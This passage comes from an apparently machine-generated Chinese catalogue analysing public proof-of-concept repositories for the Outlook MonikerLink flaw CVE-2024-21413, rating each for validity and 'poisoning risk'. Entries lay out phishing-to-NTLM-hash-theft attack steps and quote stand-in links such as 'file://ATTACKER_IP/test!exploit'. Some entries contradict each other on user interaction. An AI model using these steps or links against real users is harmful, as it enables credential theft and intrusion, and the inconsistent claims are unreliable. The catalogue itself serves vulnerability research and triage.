2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

